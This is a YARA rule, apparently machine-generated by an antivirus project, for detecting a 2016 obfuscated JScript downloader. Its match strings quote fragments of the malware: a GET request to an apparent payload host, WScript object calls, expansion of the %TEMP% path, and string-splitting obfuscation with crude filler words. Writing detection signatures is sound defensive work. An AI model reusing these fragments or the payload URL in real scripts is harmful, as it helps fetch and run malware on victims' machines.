rule sig_20160428_e1b957af7378f231614e90c0ebc84865 {
  meta:
    description = "datamaliciousorder - file 20160428_e1b957af7378f231614e90c0ebc84865.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "08ffe9c87a554607aa4ec065f8b9b594951429c12a9432f0332fb1459597985d"

  strings:
    $s1  = "TxvVgvVjsFnlYwsXqmUqa[JahEryUouQhoDztKjgJly](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function ZbsEixXchXuzNssWphDmb(EspKmmEekLpsUdxIbtBaq){GsuDkrOjaBgaCzxRlfIwd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function MniYbbHmnSqpFmeFccLrg() {return GsuDkrOjaBgaCzxRlfIwd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function ZbsEixXchXuzNssWphDmb(EspKmmEekLpsUdxIbtBaq){GsuDkrOjaBgaCzxRlfIwd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "return WkmGyyYuwRccVbrQokAqm - SgyAhxBwxSciYugAtkTfi;};" fullword ascii
    $s6  = "function XkqDheQrbKdrTolFbrHwb(WkmGyyYuwRccVbrQokAqm, SgyAhxBwxSciYugAtkTfi){CemTmwEmlUkcVwcWhqMhc = CemTmwEmlUkcVwcWhqMhc * 1; " ascii
    $s7  = "var GsuDkrOjaBgaCzxRlfIwd = function LrkSkqXsdTjyKfaBnkBuj() {return LcsMcvQicWzpYutXkdNll[YyeWyqGtjZyjHlhZoiQpq](\"WScript\"+\"" ascii
    $s8  = "var LcsMcvQicWzpYutXkdNll = this[\"WScript\"];" fullword ascii
    $s9  = "var GsuDkrOjaBgaCzxRlfIwd = function LrkSkqXsdTjyKfaBnkBuj() {return LcsMcvQicWzpYutXkdNll[YyeWyqGtjZyjHlhZoiQpq](\"WScript\"+\"" ascii
    $s10 = "function MniYbbHmnSqpFmeFccLrg() {return GsuDkrOjaBgaCzxRlfIwd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function XkqDheQrbKdrTolFbrHwb(WkmGyyYuwRccVbrQokAqm, SgyAhxBwxSciYugAtkTfi){CemTmwEmlUkcVwcWhqMhc = CemTmwEmlUkcVwcWhqMhc * 1; " ascii
    $s12 = "function YluOtmYilMjpEanIgeLbe(){return RvuLbwCtxIjeFdaEqxQkd + \"\";};" fullword ascii
    $s13 = "if (TxvVgvVjsFnlYwsXqmUqa[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function MubIzxUixWwbJfmSfuHwn() {return ((WraUytAbtUrkUpaMxzKbx == true) && (WraUytAbtUrkUpaMxzKbx == FvnPcrVdhLgfTelInfMve)) ?" ascii
    $s15 = "function MubIzxUixWwbJfmSfuHwn() {return ((WraUytAbtUrkUpaMxzKbx == true) && (WraUytAbtUrkUpaMxzKbx == FvnPcrVdhLgfTelInfMve)) ?" ascii
    $s16 = "function JxrRejEcuMzxXiyHzpYlk(){return YyeWyqGtjZyjHlhZoiQpq;};" fullword ascii
    $s17 = "QozAtkPduMdmTcyWebSga = true;" fullword ascii
    $s18 = "FvnPcrVdhLgfTelInfMve = true; " fullword ascii
    $s19 = "return XkqDheQrbKdrTolFbrHwb(1 == 1 ? HngPhtTwdHzeFjgLoxVul : 0, 1 == 1 ? KkgAcuBovPueMavMjhWun : 0);" fullword ascii
    $s20 = "var QozAtkPduMdmTcyWebSga = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}